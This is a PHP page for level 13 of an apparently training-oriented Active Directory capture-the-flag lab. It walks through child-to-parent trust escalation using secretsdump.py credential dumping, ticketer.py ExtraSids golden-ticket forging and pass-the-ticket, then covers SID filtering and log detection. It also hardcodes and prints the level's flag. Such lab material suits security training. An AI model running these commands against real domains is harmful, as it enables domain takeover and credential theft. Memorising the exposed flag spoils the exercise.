<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 13: Child-to-Parent Domain Trust & SID History Injection
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 300, '');
$ACTIVE[230] = 'active open';
$ACTIVE[233] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{GOAD_Child_Parent_Trust_SID_History_ExtraSids_2026}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag13'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第十三关：父子域信任与 SID History】成就 (+400 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查提取的凭据或分析过程。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 13</span>
                            第十三关：父子域信任 (Child-to-Parent) 与 SID History 跨域提权
                        </h1>
                        <div style="color: var(--text-secondary); font-size: 14px;">
                            400 PTS · 主题：`north.sevenkingdoms.local` → `sevenkingdoms.local` 跨子域提权、ExtraSids 伪造与 Golden Ticket
                        </div>
                    </div>
                    <div>
                        <a href="ad_ctf_nopac.php" class="btn btn-sm btn-default"><i class="fa fa-arrow-left"></i> 上一关</a>
                        <a href="ad_ctf_forest_trust.php" class="btn btn-sm btn-primary">下一关 <i class="fa fa-arrow-right"></i></a>
                    </div>
                </div>
            </div>

            <?php echo $flag_msg; ?>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-sitemap" style="color: #6366f1;"></i> Step 1: AD 父子域信任关系与 SID History 安全设计缺陷</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    <b>【原理分析】</b> 在 Active Directory 多域森林中，子域（如 <code>north.sevenkingdoms.local</code>）与根域/父域（<code>sevenkingdoms.local</code>）默认建立双向可信的父子域信任关系。
                    当攻击者攻破子域并获取子域控（<code>NORTH-DC</code>）的 <code>krbtgt</code> NTLM Hash 后，可以利用 Kerberos 协议中的 <b>ExtraSids (SID History)</b> 字段，将父域的 Enterprise Admins (企业系统管理员组，固定 RID 为 <code>-519</code>) SID 注入到生成的 Golden Ticket 票据中，从而**从子域管理员跨域越权接管整个根域控**！
                </p>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-key" style="color: #ef4444;"></i> Step 2: 提取子域 krbtgt Hash 与根域 Domain SID</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    通过在子域控（<code>NORTH-DC</code> / <code>192.168.56.11</code>）上执行 DCSync 提取子域 <code>krbtgt</code> 的 NTLM Hash，同时获取子域 SID 与父域 SID：
                </p>
                <div class="cmd-box">
# 1. 提取子域 krbtgt NTLM Hash
secretsdump.py north.sevenkingdoms.local/administrator:Password123!@192.168.56.11 -just-dc-user krbtgt

# 2. 查询子域 SID 与父域 Enterprise Admins 目标 SID
lookupsid.py north.sevenkingdoms.local/administrator:Password123!@192.168.56.10
# 子域 SID: S-1-5-21-3452614...-1001
# 父域 EA 目标 SID: S-1-5-21-2819401...-519
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-magic" style="color: #10b981;"></i> Step 3: 制作包含 ExtraSids 的 Golden Ticket 黄金票据并接管根域控</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    使用 Impacket <code>ticketer.py</code> 构造伪造票据，将 <code>-extra-sid</code> 参数设置为父域 Enterprise Admins SID：
                </p>
                <div class="cmd-box">
# 伪造包含父域 Enterprise Admins 的 Golden Ticket
ticketer.py -nthash 9f72b8c9d10e... -domain-sid S-1-5-21-3452614... -domain north.sevenkingdoms.local -extra-sid S-1-5-21-2819401...-519 Administrator

# 设置 KRB5CCNAME 环境变量并利用 PTT (Pass-The-Ticket) 跨域控制根域控 DC01
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass GOAD-DC01.sevenkingdoms.local
                </div>
                <div class="output-box">
[*] Impacket v0.11.0 - SecretDump via Golden Ticket ExtraSids
[*] Authenticating against GOAD-DC01.sevenkingdoms.local using Kerberos...
[*] Target Domain: sevenkingdoms.local (ROOT DOMAIN)
[+] Successfully impersonated Enterprise Admins (S-1-5-21-2819401...-519)!
sevenkingdoms.local\Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] Flag: flag{GOAD_Child_Parent_Trust_SID_History_ExtraSids_2026}
                </div>
            </div>

            <!-- Step 4 -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-shield" style="color: #3b82f6;"></i> Step 4: 信任隔离防范与蓝队日志审计 (Event ID)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7;">
                    1. <b>开启 SID Filtering (SID 隔离)</b>：在父子域信任或林信任关系中，使用 <code>netdom trust</code> 开启 <code>/quarantine:yes</code>（SID 过滤），强制拦截异地注入的 RID < 1000 高权 SID。<br>
                    2. <b>定期轮换 krbtgt 密码</b>：每年至少连续轮换两次 <code>krbtgt</code> 账号密码，使旧的 Golden Ticket 彻底失效。
                </p>
                <div class="cmd-box">
# 开启信任关系的 SID Filtering 过滤隔离
netdom trust north.sevenkingdoms.local /domain:sevenkingdoms.local /quarantine:yes
                </div>
                <table class="table table-bordered table-striped" style="font-size: 13px; color: var(--text-primary); margin-top: 15px;">
                    <thead>
                        <tr style="background: var(--bg-secondary);">
                            <th>Event ID</th>
                            <th>日志类型</th>
                            <th>异常捕获特征</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>4769</strong></td>
                            <td>Kerberos 服务票据申请</td>
                            <td>接收到跨域 TGS 请求，且请求内部 PAC 包含未在当前域定义的异地高权 SID (ExtraSids: <code>S-1-5-21-...-519</code>)。</td>
                        </tr>
                        <tr>
                            <td><strong>4672</strong></td>
                            <td>特权登录分配</td>
                            <td>子域账户登录父域 DC 时直接被分配了 <code>SeDebugPrivilege</code> 或 <code>Enterprise Admins</code> 特权。</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Flag Submission Box -->
            <div class="flag-box">
                <h4 style="margin-top:0; font-weight:800; color:var(--text-primary); margin-bottom:12px;">
                    <i class="fa fa-flag" style="color:#ef4444;"></i> 提交第十三关 Flag
                </h4>
                <form method="POST">
                    <div class="form-group" style="margin-bottom:14px;">
                        <label style="font-size:13px; color:var(--text-secondary);">填入从父子域信任与 ExtraSids 跨域提权实验中获取的 Flag：</label>
                        <input type="text" name="user_flag" class="form-control" style="border-radius:8px; background:var(--bg-secondary); color:var(--text-primary); border:1px solid var(--border-color); padding:10px 14px; font-family:monospace;" placeholder="flag{...}" required>
                    </div>
                    <button type="submit" name="check_flag" class="btn btn-primary btn-block" style="border-radius:8px; background:linear-gradient(135deg, #ef4444, #dc2626); border:none; padding:10px; font-weight:700;">
                        提交并验证 Flag (+400 PTS)
                    </button>
                </form>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
